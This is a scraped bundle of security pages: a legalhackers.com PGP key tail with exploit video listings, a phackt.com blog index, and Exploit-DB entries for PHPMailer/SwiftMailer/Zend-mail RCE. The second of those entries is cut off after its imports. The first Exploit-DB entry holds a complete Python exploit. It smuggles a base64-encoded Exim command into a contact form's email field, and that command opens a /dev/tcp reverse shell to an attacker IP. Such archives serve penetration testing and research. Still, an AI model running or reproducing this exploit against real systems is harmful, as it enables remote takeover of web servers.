T6f8+gYU4SSlN/T9KiamAzlA9Nz7QdgEcXPq8tMexKQnoCyDM0wSHqOB1en7RRTN
JdchOynTYzFWt+IBoQRGspQE1SXP2RLUwioedtDz+C21iyNMwR6OcCoCFfGV2eeZ
aFM7oCKwSz9oxCJ+D3SUv5U9AZjKFoV0B52dJVVzeaqtnO3lJi7dK8+NTNY5ML+N
3cacO9qnngoNJ/iy/AtjTdmX+XHgCuSnEbY2kh3A1uAyr5ygh1YQ7K4kG7I7AXo9
lgrzQY7/xg8+uSY0NS4kJG/OEDBxX+yhNNBhABEBAAG0J0Rhd2lkIEdvbHVuc2tp
IDxkYXdpZEBsZWdhbGhhY2tlcnMuY29tPokBOAQTAQIAIgUCVcjBNgIbAwYLCQgH
AwIGFQgCCQoLBBYCAwECHgECF4AACgkQU/e+VX9sCuRSmAf+MXvieaQiPYNgjey0
lVmvEw/+6EJ4DFZ203mLdrDwKLPSe0GrzbYyma2AA8XcWDimuhvsJLJ4Rt8j7F9W
G8kyaCh0ms/NTlSI3aI5ctcaX79WtmOLwfTo+rtl0czj/3ZMXHHnH1ky0M390VQ8
ixsk5Y53wAeTSrvN8Rwyg0x1ZHanwBmgDtFPa1ubYmFDHx/Ke1H57EvVMlyi4Yz5
vs58rqr3UNKxwoANQ0X38BGHZ7K1zObZGOwJGkuGt+K3LvBOLn7fbS1P4i6u5oIw
vJRDyq6ZWrLivkc3pypUV09jjQ9vQIRSXwhfCPwRb/U45SgnO5zTq8Ospb9qsG2E
remeaLkBDQRVyME2AQgArg35L60GCpwFjMGZ4KhHedD+ioaW08E4S9pCuxsE2kzC
D/0RfzAlKeCgvrULGCTXU4kcy3ODAeNlByEtF1SE7FlSteS1X12S4Kyn8RXhYhjI
XNwYzTGTStwprYMaRSEcIqCIAHa/dcOZzsiibf+G1phwKs7FU31TSgZrbpEjNdYO
AzFpeV7BqHoo2lMQJCDEN2EIb5KEQvNxyzFjyjHcnuJ/4GQRYF0xBcVqjoiqoedF
8Uib8WM9yFF+W21auZ+yURPp6HdqT6Cv6Qx2djpC3uKfms6VOJKBDVSiQhx/GcKh
dPAobFVDfOdeWj88v3RZyR9wwRAlur5qRVIzD75iTQARAQABiQEfBBgBAgAJBQJV
yME2AhsMAAoJEFP3vlV/bArktOoH/2ID21GHxsDX/x6cutapMuveK/4pmZ/U2jWr
r+urzFYKV+muezkJCm2qy02pcJYud1DxRY5aCe2J5m1WYGROnCm5CyBb8NiQLBeK
uzk4cK1fYqk35475dE+vHdnFdz1Td2laSafYze+M2KPX82YN4R/dGsOn8hR+39b4
WXS7zzoHh+KSwvs2ab6E8Nd3p4s0jvOvQo/+L52q1+iWSnzahXRTc3u1RHIzTf+f
X6NszAhli121jVQxLeaSuxkXyuKZM5IcFfojY55GSjLUblA1A+I2qmkcheA6rs4E
hZ+4m5DgtVG5+fJpoDLLxtKYp4hSxhd59Z9mlTWMqptK0WGkW48=
=vtjs
-----END [PGP PUBLIC KEY](http://legalhackers.com/dawid_lh.pgp) BLOCK-----
```

# ExploitBox

1. [![](exploitbox_logo.png)
   **ExploitBox.io** - A Playground & Labs For Bug Hunters, Researchers, Penetration Testers &
   others interested in hacking, security, exploits and the art of exploitation.](https://ExploitBox.io)

# PoC Videos

1. [SquirrelMail < 1.4.23 Remote Code Execution (CVE-2017-7692)](https://legalhackers.com/videos/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html)
2. [PHPMailer / SwiftMailer / Zend-mail - Remote Code Execution
   (CVE-2016-10033 / CVE-2016-10045 / CVE-2016-10074 / CVE-2016-10034)](https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html)
3. [Nagios Core < 4.2.4 Root Privilege Escalation (CVE-2016-9566)](https://legalhackers.com/videos/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html)
4. [Nagios Core < 4.2.2 Curl Command Injection / Remote Code Execution (CVE-2016-9565)](https://legalhackers.com/videos/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html)
5. [MySQL / MariaDB / Percona - Race Cond. & Root Privilege Esc. (CVE-2016-6663 & CVE-2016-6664)](https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html)
6. [Nginx (Debian-based + Gentoo distros) - Root Privilege Escalation (CVE-2016-1247)](https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)
7. [Apache Tomcat (Debian-based distros) <= 6/7/8 Root Privilege Escalation (CVE-2016-1240)](http://legalhackers.com/videos/Apache-Tomcat-DebPkg-Root-PrivEsc-Exploit.html)
8. [Adobe ColdFusion <= 11 XML External Entity (XXE) Injection Exploit (CVE-2016-4264)](http://legalhackers.com/videos/Adobe-ColdFusion-11-XXE-Exploit-CVE-2016-4264.html)

# Security Papers

1. [Pwning PHP mail() function For Fun And Remote Code Execution - New Exploitation Techniques And Vectors](https://legalhackers.com/papers/Pwning-PHP-mail-func-For-Fun-And-RCE-New-Exploit-Techniques-Vectors.html)

[Follow @dawid\_golunski](https://twitter.com/%40dawid_golunski)

Legal Hackers ¬© 2024



=== Content from www.exploit-db.com_a4ac9c5f_20250125_124359.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution

#### EDB-ID:

###### 42221

#### CVE:

###### [2016-10074](https://nvd.nist.gov/vuln/detail/CVE-2016-10074) [2016-10045](https://nvd.nist.gov/vuln/detail/CVE-2016-10045) [2016-10034](https://nvd.nist.gov/vuln/detail/CVE-2016-10034) [2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

**EDB Verified:**

#### Author:

###### [phackt\_ul](/?author=8944)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2017-06-21

---

**Vulnerable App:**

```
#!/usr/bin/python
#
# Exploit Title: [RCE for PHPMailer < 5.2.20 with Exim MTA]
# Date: [16/06/2017]
# Exploit Author: [@phackt_ul]
# Software Link: [https://github.com/PHPMailer/PHPMailer]
# Version: [< 5.2.20]
# Tested on: [Debian x86/x64]
# CVE : [CVE-2016-10033,CVE-2016-10074,CVE-2016-10034,CVE-2016-10045]
#
# @phackt_ul - https://phackt.com
#
# Find the last updated version here: https://raw.githubusercontent.com/phackt/pentest/master/exploits/rce_phpmailer_exim.py
#
# All credits go to Dawid Golunski (@dawid_golunski) - https://legalhackers.com
# and its research on PHP libraries vulns
#
# PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)
# PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass
# SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
# Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
#
# ExploitBox project:
# https://ExploitBox.io
#
# Full advisory URL:
# https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
# https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html
# http://pwnscriptum.com/
#
# --------------------------------------------------------
# Enhanced for Exim MTA
#
# N.B:
# The original author's method in the PHPMailer POC (for sendmail MTA) uses the RFC 3696
# double quotes technique associated with the -oQ -X options to log mailer traffic and to create
# the backdoor. This technique is not facing some payload size issues because the payload
# was in the email body.
#
# For Exim:
# The original author's Wordpress 4.6 POC for Exim combines the comment syntax (RFC 822)
# and the Exim expansion mode techniques. The use of substr on spool_directory and tod_log
# expansion variables in order to bypass the PHP mail() escaping may leads to large
# email addresses payloads. However the comment syntax validateAddress() technique does not
# face any size limitation but its use can not be applied for PHPMailer < 5.2.20.
#
# Goal:
# The use of double quotes validateAdresse() technique (and it's patch bypass for PHPMailer < 5.5.20)
# combined with the Exim expansion mode technique may leads to large payloads quickly facing addresses
# size limit here (260 chars) and so not matching the pcre8 regexp in the validateAddress() function.
# We are now base64 encoding the command in order to bypass escapeshellcmd() and allowing larger payloads.
#
#
# Usage:
# ./rce_phpmailer_exim4.py -url http://victim/phpmailer/ -cf contact_form.php -ip 192.168.1.109 -p 1337
#
#
# Requirements:
# - Vulnerable PHP libraries
# - Exim MTA Agent
#
#
# Disclaimer:
# For testing purposes only on your local machine - http://pwnscriptum.com/PwnScriptum_PHPMailer_PoC_contactform.zip

import argparse
import urllib
import urllib2
import base64

# Prepare command for Exim expansion mode in order
def prepare_cmd(cmd):
    return '${run{${base64d:%s}}}' % base64.b64encode(cmd)

# Send Request method
def send_request(req):
    try:
        urllib2.urlopen(req)
    except urllib2.HTTPError, e:
        print "[!] Got HTTP error: [%d] when trying to reach " % e.code + req.get_full_url() + " - Check the URL!\n\n"
        exit(3)
    except urllib2.URLError, err:
        print "[!] Got the '%s' error when trying to reach " % str(err.reason) + req.get_full_url() + " - Check the URL!\n\n"
        exit(4)

# Parse input args
parser = argparse.ArgumentParser(prog='rce_phpmailer_exim4.py', description='PHPMailer / Zend-mail / SwiftMailer - RCE Exploit for Exim4 based on LegalHackers sendmail version')
parser.add_argument('-url', dest='WEBAPP_BASE_URL', required=True,  help='WebApp Base Url')
parser.add_argument('-cf',  dest='CONTACT_SCRIPT',  required=True,  help='Contact Form scriptname')
parser.add_argument('-ip',  dest='ATTACKER_IP',    required=True,  help='Attacker IP for reverse shell')
parser.add_argument('-p',   dest='ATTACKER_PORT',  required=False, help='Attackers Port for reverse shell', default="8888")
parser.add_argument('--post-action', dest='POST_ACTION',  required=False, help='Overrides POST "action" field name',         default="send")
parser.add_argument('--post-name',   dest='POST_NAME',    required=False, help='Overrides POST "name of sender" field name', default="name")
parser.add_argument('--post-email',  dest='POST_EMAIL',   required=False, help='Overrides POST "email" field name',          default="email")
parser.add_argument('--post-msg',    dest='POST_MSG',     required=False, help='Overrides POST "message" field name',        default="msg")
args = parser.parse_args()

CONTACT_SCRIPT_URL = args.WEBAPP_BASE_URL + args.CONTACT_SCRIPT

# Show params
print """[+] Setting vars to: \n
WEBAPP_BASE_URL      = [%s]
CONTACT_SCRIPT       = [%s]
ATTACKER_IP          = [%s]
ATTACKER_PORT        = [%s]
POST_ACTION          = [%s]
POST_NAME            = [%s]
POST_EMAIL           = [%s]
POST_MSG             = [%s]
""" % (args.WEBAPP_BASE_URL, args.CONTACT_SCRIPT, args.ATTACKER_IP, args.ATTACKER_PORT, args.POST_ACTION, args.POST_NAME, args.POST_EMAIL, args.POST_MSG)

# Ask for mail library
print "[+] Choose your target / payload: "
print "\033[1;34m"
print "[1] PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)"
print "    SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)"
print "    Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)\n"
print "[2] PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass"
print "\033[0m"

try:
    target = int(raw_input('[?] Select target [1-2]: '))
except ValueError:
    print "Not a valid choice. Exiting\n"
    exit(2)

if (target>2):
    print "No such target. Exiting\n"
    exit(3)

################################
# Payload
################################
cmd = "/bin/bash -c '0<&196;exec 196<>/dev/tcp/%s/%s;nohup sh <&196 >&196 2>&196 &'" % (args.ATTACKER_IP, args.ATTACKER_PORT)
prepared_cmd = prepare_cmd(cmd)

payload = '"a\\" -be ' + prepared_cmd + ' "@a.co'

# Update payloads for PHPMailer bypass (PHPMailer < 5.2.20)
if target == 2:
    payload = "\"a\\' -be " + prepared_cmd + " \"@a.co"

################################
# Attack episode
# This step will execute the reverse shell
################################

# Form fields
post_fields = {'action': "%s" % args.POST_ACTION, "%s" % args.POST_NAME: 'Jas Fasola', "%s" % args.POST_EMAIL: payload, "%s" % args.POST_MSG: 'Really important message'}

# Print relevant information
print "\n[+] Executing command on victim server\n"
print '[!] command: [%s]' % cmd
print '[!] payload: [%s]' % payload
print '[!] post_fields: [%s]\n' % str(post_fields)

data = urllib.urlencode(post_fields)
req = urllib2.Request(CONTACT_SCRIPT_URL, data)
send_request(req)

print "\033[1;32m[+] You should check your listener and cross the fingers ;)\033[0m\n"

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

¬©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

√ó

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as ‚ÄúGoogle Hacking‚Äù was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny‚Äôs talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term ‚ÄúGoogledork‚Äù to refer
to ‚Äúa foolish or inept person as revealed by Google‚Äú. This was meant to draw attention to
the fact that this was not a ‚ÄúGoogle problem‚Äù but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term ‚Äúdork‚Äù became shorthand for a search query that located sensitive
information and ‚Äúdorks‚Äù were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

√ó

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

√ó

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from phackt.com_744525a9_20250126_083817.html ===


[![logo](https://phackt.com/public/images/logo/logo_white_transparent.png "logo")](/ "Home")

[Home](https://phackt.com/)
[Categories](https://phackt.com/categories/)
[Tools](https://phackt.com/tools/)
[About](https://phackt.com/about/)

¬© 2024. All rights reserved.

### [phackt.com:~#](/ "Home") \_

[![](https://phackt.com/public/images/icons/drapeau_en.png)](https://medium.com/tenable-techblog/silo-or-not-silo-that-is-the-question-d0141d0cbb78)
# [Should a Tier 0 WSUS be put in a silo or not ?](https://medium.com/tenable-techblog/silo-or-not-silo-that-is-the-question-d0141d0cbb78)

18 Jan 2023
The question was: should I put my WSUS server into my T0 silo? Even if people are familiar with the concepts of Active Directory Tiering, ...

[Read more ...](https://medium.com/tenable-techblog/silo-or-not-silo-that-is-the-question-d0141d0cbb78)

---

[![](https://phackt.com/public/images/icons/drapeau_en.png)](https://medium.com/tenable-techblog/how-to-mimic-kerberos-protocol-transition-using-reflective-rbcd-a4984bb7c4cb)
# [How to mimic Kerberos protocol transition using reflective RBCD](https://medium.com/tenable-techblog/how-to-mimic-kerberos-protocol-transition-using-reflective-rbcd-a4984bb7c4cb)

07 Nov 2022
As I am often looking for misconfigurations dealing with Kerberos delegation, I realize that I was missing an interesting element while playing with the Kerberos protocol extensions S4U2Self and S4U2Proxy.

[Read more ...](https://medium.com/tenable-techblog/how-to-mimic-kerberos-protocol-transition-using-reflective-rbcd-a4984bb7c4cb)

---

[![](https://phackt.com/public/images/icons/drapeau_en.png)](https://phackt.com/dnsadmins-group-mitigation)

# [How to mitigate DnsAdmins privilege escalation ?](https://phackt.com/dnsadmins-group-mitigation)

12 May 2021

Hello,

Glad to see you in this second part of this [post](https://phackt.com/dnsadmins-group-exploitation-write-permissions). In our previous [article](https://phackt.com/dnsadmins-group-exploitation-write-permissions) we showed which rights were involved in the DnsAdmins privilege escalation. Now let‚Äôs talk about how to properly mitigate this.

[Read more ...](https://phackt.com/dnsadmins-group-mitigation)

---

[![](https://phackt.com/public/images/icons/drapeau_en.png)](https://phackt.com/dnsadmins-group-exploitation-write-permissions)

# [Why DnsAdmins privilege escalation is still working ?](https://phackt.com/dnsadmins-group-exploitation-write-permissions)

22 Apr 2021

Hello,

In this article, first part of a serie, i‚Äôm talking about **DnsAdmins** and why this is a group you should take care of. I know that several articles talk about the privilege escalation (DNS service running on a domain controller and loading an arbitrary DLL).

We will quickly review this attack, but mainly i would rather focus on why it is still working nowadays, which permissions do you need to run this attack. I will conclude in a second part with the mitigations which can be implemented to prevent this attack.

[Read more ...](https://phackt.com/dnsadmins-group-exploitation-write-permissions)

---

[![](https://phackt.com/public/images/icons/drapeau_en.png)](https://phackt.com/en-kerberos-constrained-delegation-with-protocol-transition)

[![](https://phackt.com/public/images/icons/drapeau_fr.png)](https://phackt.com/fr-kerberos-constrained-delegation-with-protocol-transition)
# [Kerberos constrained delegation with protocol transition](https://phackt.com/en-kerberos-constrained-delegation-with-protocol-transition)

27 Nov 2020

Hello,

Today, we are talking about the exploitation of Kerberos protocol extensions [S4U2Self](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13) and [S4U2Proxy](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a) in order to impersonate a privileged user of the domain.

This post aims at focusing on the [Kerberos constrained delegation with protocol transition](https://docs.microsoft.com/fr-fr/previous-versions/windows/it-pro/windows-server-2003/cc739587%28v%3Dws.10%29) which we will shorten `T2A4D` (**TrustedToAuthForDelegation**); how to enumerate it, how to exploit it and use it as a method of persistence.

[Read more ...](https://phackt.com/en-kerberos-constrained-delegation-with-protocol-transition)

---

[![](https://phackt.com/public/images/icons/drapeau_en.png)](https://phackt.com/pentesting-bloodhound-cypher-queries)

# [More BloodHound Cypher queries](https://phackt.com/pentesting-bloodhound-cypher-queries)

04 Oct 2020

Hello,

In this blog post i will share my Cypher queries which i‚Äôm using in my daily engagements. I aim to be complementary to the [cheatsheets](https://www.google.com/search?q=bloodhound+cypher+queries+cheatsheet) you can found out there and to the default queries you will find in [BloodHound](https://github.com/BloodHoundAD/BloodHound).

[Read more ...](https://phackt.com/pentesting-bloodhound-cypher-queries)

---

[![](https://phackt.com/public/images/icons/drapeau_en.png)](https://phackt.com/securitytube-redteam-labs-invoke-recon)

# [SecurityTube Advanced Red Team Lab training - Worth it ?](https://phackt.com/securitytube-redteam-labs-invoke-recon)

22 Sep 2020

Quick answer: **Totally** !

Hello everybody,

I would like to talk a bit about the [SecurityTube red team labs](https://www.pentesteracademy.com/redlabs), specifically the [Advanced Red Team Lab](https://www.pentesteracademy.com/redteamlab) which leads to the **CRTE** (Certified Red Team Expert) certification. *P.S: i‚Äôm not affiliated with securitytube*.

Some great [reviews](https://www.google.com/search?q=review+red+team+lab+pentester+academy+%22CRTE%22) are already existing, so i will focus on why i chose this lab and certification. I will give you some hints about how to approach your targets. Most importantly, i would like to introduce you a tool that i developped which will help you during your journey, [Invoke-Recon](https://github.com/phackt/Invoke-Recon).

[Read more ...](https://phackt.com/securitytube-redteam-labs-invoke-recon)

---

[Older](https://phackt.com/page2)
Newer



=== Content from www.exploit-db.com_0d2f2e33_20250125_124358.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# PHPMailer < 5.2.20 / SwiftMailer < 5.4.5-DEV / Zend Framework / zend-mail < 2.4.11 - 'AIO' 'PwnScriptum' Remote Code Execution

#### EDB-ID:

###### 40986

#### CVE:

###### [2016-10074](https://nvd.nist.gov/vuln/detail/CVE-2016-10074) [2016-10045](https://nvd.nist.gov/vuln/detail/CVE-2016-10045) [2016-10034](https://nvd.nist.gov/vuln/detail/CVE-2016-10034) [2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

**EDB Verified:**

#### Author:

###### [Dawid Golunski](/?author=1951)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2017-01-02

---

**Vulnerable App:**

```
#!/usr/bin/python

intro = """\033[94m
    __                     __   __  __           __
   / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
  / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
 / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
/_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/

PHPMailer / Zend-mail / SwiftMailer - Remote Code Execution Exploit
		     a.k.a "PwnScriptum"

 CVE-2016-10033 + CVE-2016-10045 + CVE-2016-10034 + CVE-2016-10074

This PoC exploit aims to execute a reverse shell on the target in
the context of the web-server user via vulnerable PHP email library.

Discovered and Coded by:

\033[1;34m
 Dawid Golunski
 https://legalhackers.com

 t: @dawid_golunski for updates
\033[0m
\033[94m
P.$. For testing only! Don't break the Web ;)
\033[0m
"""
info = """
[Version]
Limited (ver. 1.0)

[PoC Video]
See the the exploit in action at:

https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html

[Info]
This exploit targets a common webapp component - Contact Form.

It combines payloads for the following vulns:

1. PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html

2. PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045 / escapeshell bypass)
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln.html

3. SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html

4. Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html

[Usage]

./PwnScriptum_RCE_exploit.py [-h] -url WEBAPP_BASE_URL -cf CONTACT_SCRIPT
                                  [-d TARGET_UP_DIR] -ip ATTACKERS_IP
                                  [-p ATTACKERS_PORT] [--version]
                                  [--post-action POST_ACTION]
                                  [--post-name POST_NAME]
                                  [--post-email POST_EMAIL]
                                  [--post-msg POST_MSG]

Note, make sure the contact form matches the default field names (send/name/email/msg).
Otherwise override with --post-msg=message_box for example.

"""

import os
import argparse
import time
import urllib
